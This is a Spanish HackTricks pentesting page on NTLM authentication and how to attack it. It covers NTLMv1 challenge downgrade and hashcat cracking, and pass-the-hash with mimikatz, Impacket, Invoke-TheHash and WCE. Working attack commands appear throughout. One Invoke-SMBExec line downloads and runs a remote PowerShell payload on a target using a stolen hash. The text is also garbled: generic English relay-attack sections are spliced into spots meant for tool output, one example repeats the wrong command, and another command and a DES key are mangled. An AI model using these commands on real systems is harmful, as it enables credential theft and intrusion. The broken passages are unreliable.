# NTLM

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme en** **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Información Básica

**Credenciales NTLM**: Nombre de dominio (si lo hay), nombre de usuario y hash de contraseña.

**LM** solo está **habilitado** en **Windows XP y Server 2003** (los hashes LM se pueden descifrar). El hash LM AAD3B435B51404EEAAD3B435B51404EE significa que no se está utilizando LM (es el hash LM de una cadena vacía).

Por defecto se utiliza **Kerberos**, por lo que NTLM solo se usará si **no hay ningún Active Directory configurado**, el **dominio no existe**, **Kerberos no está funcionando** (mala configuración) o el **cliente** que intenta conectarse usa la IP en lugar de un nombre de host válido.

Los **paquetes de red** de una **autenticación NTLM** tienen la **cabecera** "**NTLMSSP**".

Los protocolos: LM, NTLMv1 y NTLMv2 son compatibles en la DLL %windir%\Windows\System32\msv1\_0.dll

## LM, NTLMv1 y NTLMv2

Puedes verificar y configurar qué protocolo se utilizará:

### GUI

Ejecuta _secpol.msc_ -> Políticas locales -> Opciones de seguridad -> Seguridad de red: Nivel de autenticación de LAN Manager. Hay 6 niveles (del 0 al 5).

![](<../../.gitbook/assets/image (92).png>)

### Registro

Esto establecerá el nivel 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Posibles valores:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Esquema básico de autenticación de dominio NTLM

1. El **usuario** introduce sus **credenciales**
2. La máquina cliente **envía una solicitud de autenticación** enviando el **nombre de dominio** y el **nombre de usuario**
3. El **servidor** envía el **reto**
4. El **cliente cifra** el **reto** usando el hash de la contraseña como clave y lo envía como respuesta
5. El **servidor envía** al **controlador de dominio** el **nombre de dominio, el nombre de usuario, el reto y la respuesta**. Si no hay un Directorio Activo configurado o el nombre de dominio es el nombre del servidor, las credenciales se **verifican localmente**.
6. El **controlador de dominio verifica si todo es correcto** y envía la información al servidor

El **servidor** y el **controlador de dominio** pueden crear un **Canal Seguro** a través del servidor **Netlogon** ya que el controlador de dominio conoce la contraseña del servidor (está dentro de la base de datos **NTDS.DIT**).

### Esquema de autenticación NTLM local

La autenticación es como la mencionada **anteriormente pero** el **servidor** conoce el **hash del usuario** que intenta autenticarse dentro del archivo **SAM**. Entonces, en lugar de preguntar al controlador de dominio, el **servidor verificará por sí mismo** si el usuario puede autenticarse.

### Desafío NTLMv1

La **longitud del desafío es de 8 bytes** y la **respuesta tiene una longitud de 24 bytes**.

El **hash NT (16 bytes)** se divide en **3 partes de 7 bytes cada una** (7B + 7B + (2B+0x00\*5)): la **última parte se llena con ceros**. Luego, el **desafío** se **cifra por separado** con cada parte y los bytes cifrados resultantes se **unen**. Total: 8B + 8B + 8B = 24 bytes.

**Problemas**:

* Falta de **aleatoriedad**
* Las 3 partes pueden ser **atacadas por separado** para encontrar el hash NT
* **DES es crackeable**
* La 3ª clave está compuesta siempre por **5 ceros**.
* Dado el **mismo desafío** la **respuesta** será la **misma**. Por lo tanto, puedes dar como **desafío** a la víctima la cadena "**1122334455667788**" y atacar la respuesta usando **tablas arcoíris precalculadas**.

### Ataque NTLMv1

Actualmente es menos común encontrar entornos con Delegación Sin Restricciones configurada, pero esto no significa que no puedas **abusar de un servicio de Cola de Impresión** configurado.

Podrías abusar de algunas credenciales/sesiones que ya tienes en el AD para **solicitar a la impresora que se autentique** contra algún **host bajo tu control**. Luego, usando `metasploit auxiliary/server/capture/smb` o `responder` puedes **establecer el desafío de autenticación en 1122334455667788**, capturar el intento de autenticación y si se hizo usando **NTLMv1** podrás **crackearlo**.\
Si estás usando `responder` podrías intentar \*\*usar la bandera `--lm` \*\* para intentar **degradar** la **autenticación**.\
_Ten en cuenta que para esta técnica la autenticación debe realizarse utilizando NTLMv1 (NTLMv2 no es válido)._

Recuerda que la impresora usará la cuenta de equipo durante la autenticación, y las cuentas de equipo usan **contraseñas largas y aleatorias** que **probablemente no podrás crackear** usando **diccionarios comunes**. Pero la autenticación **NTLMv1** **usa DES** ([más información aquí](./#ntlmv1-challenge)), por lo que usando algunos servicios especialmente dedicados a crackear DES podrás crackearlo (podrías usar [https://crack.sh/](https://crack.sh) por ejemplo).

### Ataque NTLMv1 con hashcat

NTLMv1 también puede ser roto con la Herramienta Multi NTLMv1 [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) que formatea los mensajes NTLMv1 de una manera que puede ser rota con hashcat.

El comando
```
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
## NTLM Relay Attack

### Introduction

In a Windows environment, NTLM (NT LAN Manager) is a suite of security protocols used for authentication. NTLM relay attack is a common technique used by hackers to intercept and relay NTLM authentication traffic to gain unauthorized access to a target system.

### Description

During an NTLM relay attack, the hacker captures NTLM authentication traffic between a client and a server. The attacker then relays this captured traffic to another system, tricking it into believing that the attacker is the legitimate user. This allows the hacker to impersonate the user and potentially gain access to sensitive information or resources on the target system.

### Mitigation

To mitigate NTLM relay attacks, it is recommended to implement SMB signing, LDAP signing, and enforce the use of Kerberos authentication instead of NTLM where possible. Additionally, using strong, unique passwords and regularly monitoring for suspicious activity can help prevent unauthorized access through NTLM relay attacks.

### Tools

There are various tools available to perform NTLM relay attacks, such as Responder, ntlmrelayx, and Impacket. These tools automate the process of capturing and relaying NTLM authentication traffic, making it easier for hackers to exploit this vulnerability.
```
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Relaying

## Introduction

NTLM relaying is a common technique used by attackers to escalate privileges in a Windows environment. This attack involves intercepting an NTLM authentication request and relaying it to another machine, tricking it into believing the attacker is the legitimate user.

## How it works

1. The attacker intercepts an NTLM authentication request from a victim machine.
2. The attacker relays the authentication request to a target machine.
3. The target machine processes the request, thinking it is coming from the victim.
4. If successful, the attacker gains unauthorized access to the target machine.

## Mitigation

To mitigate NTLM relaying attacks, consider implementing the following measures:

- Disable NTLM authentication where possible.
- Use Kerberos authentication instead of NTLM.
- Implement SMB signing to prevent tampering with authentication traffic.
- Monitor network traffic for signs of NTLM relaying attacks.

By following these best practices, you can reduce the risk of falling victim to NTLM relaying attacks.
```
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Ejecuta hashcat (es mejor distribuido a través de una herramienta como hashtopolis) ya que de lo contrario tomará varios días.
```
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
En este caso sabemos que la contraseña es password, por lo que vamos a hacer trampa con fines de demostración:
```
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Necesitamos ahora utilizar las utilidades de hashcat para convertir las claves DES descifradas en partes del hash NTLM:
```
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
## NTLM Relay Attack

### Introduction

NTLM relay attacks are a common technique used by attackers to escalate privileges within a network. This attack involves intercepting NTLM authentication traffic and relaying it to a target server to gain unauthorized access.

### How it Works

1. The attacker intercepts NTLM authentication traffic between a client and a server.
2. The attacker relays this traffic to another server within the network.
3. The target server receives the relayed authentication request, believing it is coming from the original client.
4. If successful, the attacker gains unauthorized access to the target server using the intercepted credentials.

### Mitigation

To mitigate NTLM relay attacks, consider implementing the following measures:

- **Enforce SMB Signing**: Require SMB signing to prevent tampering with authentication traffic.
- **Enable Extended Protection for Authentication**: Helps protect against NTLM relay attacks by requiring stronger authentication.
- **Use Kerberos**: Consider using Kerberos authentication instead of NTLM to reduce the risk of relay attacks.
- **Disable NTLM**: If possible, disable NTLM authentication to eliminate the risk of NTLM relay attacks.

By implementing these measures, you can significantly reduce the risk of falling victim to NTLM relay attacks.
```
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
### NTLM Relay Attack

#### Overview

NTLM Relay Attack is a type of attack where an attacker captures the NTLM authentication request sent by a victim and relays it to a target server to authenticate as the victim. This attack can be used to gain unauthorized access to a target system by exploiting the NTLM authentication protocol.

#### How it works

1. The attacker intercepts the NTLM authentication request sent by the victim.
2. The attacker relays the captured request to a target server.
3. The target server authenticates the attacker as the victim, granting unauthorized access.

#### Mitigation

To mitigate NTLM Relay Attacks, consider implementing the following measures:

- **Enforce SMB Signing**: Enable SMB signing to prevent attackers from relaying NTLM authentication requests.
- **Use LDAP Signing**: Implement LDAP signing to protect against NTLM relay attacks in LDAP environments.
- **Enable Extended Protection for Authentication**: This feature helps protect against NTLM relay attacks by requiring extended protection for authentication.

By implementing these measures, you can enhance the security of your systems and protect against NTLM Relay Attacks.
```
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Desafío NTLMv2

El **largo del desafío es de 8 bytes** y se envían **2 respuestas**: Una tiene una longitud de **24 bytes** y la longitud de la **otra** es **variable**.

**La primera respuesta** se crea cifrando usando **HMAC\_MD5** la **cadena** compuesta por el **cliente y el dominio** y utilizando como **clave** el **hash MD4** del **hash NT**. Luego, el **resultado** se utilizará como **clave** para cifrar usando **HMAC\_MD5** el **desafío**. A esto se le añadirá **un desafío del cliente de 8 bytes**. Total: 24 B.

La **segunda respuesta** se crea utilizando **varios valores** (un nuevo desafío de cliente, una **marca de tiempo** para evitar **ataques de repetición**...)

Si tienes un **pcap que ha capturado un proceso de autenticación exitoso**, puedes seguir esta guía para obtener el dominio, nombre de usuario, desafío y respuesta e intentar descifrar la contraseña: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pasar el Hash

**Una vez que tengas el hash de la víctima**, puedes usarlo para **hacerte pasar por ella**.\
Necesitas utilizar una **herramienta** que **realizará** la **autenticación NTLM usando** ese **hash**, **o** podrías crear un nuevo **inicio de sesión de sesión** e **inyectar** ese **hash** dentro del **LSASS**, para que cuando se realice cualquier **autenticación NTLM**, se utilice ese **hash**. La última opción es lo que hace mimikatz.

**Por favor, recuerda que también puedes realizar ataques de Pasar el Hash utilizando cuentas de Computadora.**

### **Mimikatz**

**Debe ejecutarse como administrador**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Esto lanzará un proceso que pertenecerá a los usuarios que hayan iniciado mimikatz, pero internamente en LSASS las credenciales guardadas son las que están dentro de los parámetros de mimikatz. Luego, puedes acceder a los recursos de red como si fueras ese usuario (similar al truco `runas /netonly` pero sin necesidad de conocer la contraseña en texto plano).

### Pass-the-Hash desde Linux

Puedes obtener ejecución de código en máquinas Windows usando Pass-the-Hash desde Linux.\
[**Accede aquí para aprender cómo hacerlo.**](../../windows/ntlm/broken-reference/)

### Herramientas compiladas de Impacket para Windows

Puedes descargar [binarios de Impacket para Windows aquí](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (En este caso necesitas especificar un comando, cmd.exe y powershell.exe no son válidos para obtener una shell interactiva) `C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Hay varios binarios de Impacket más...

### Invoke-TheHash

Puedes obtener los scripts de PowerShell desde aquí: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient

#### Invocar-SMBClient
```
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum

#### Invocar-SMBEnum
```
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Esta función es una **combinación de todas las demás**. Puedes pasar **varios hosts**, **excluir** algunos y **seleccionar** la **opción** que deseas utilizar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Si seleccionas **cualquiera** de **SMBExec** y **WMIExec** pero **no** proporcionas ningún parámetro de _**Comando**_, simplemente **verificará** si tienes **suficientes permisos**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Editor de Credenciales de Windows (WCE)

**Debe ejecutarse como administrador**

Esta herramienta hará lo mismo que mimikatz (modificar la memoria de LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ejecución remota manual de Windows con nombre de usuario y contraseña

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Extracción de credenciales de un host de Windows

**Para obtener más información sobre** [**cómo obtener credenciales de un host de Windows, deberías leer esta página**](broken-reference)**.**

## NTLM Relay y Responder

**Lee una guía más detallada sobre cómo realizar estos ataques aquí:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Analizar desafíos NTLM desde una captura de red

**Puedes usar** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme en** **Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
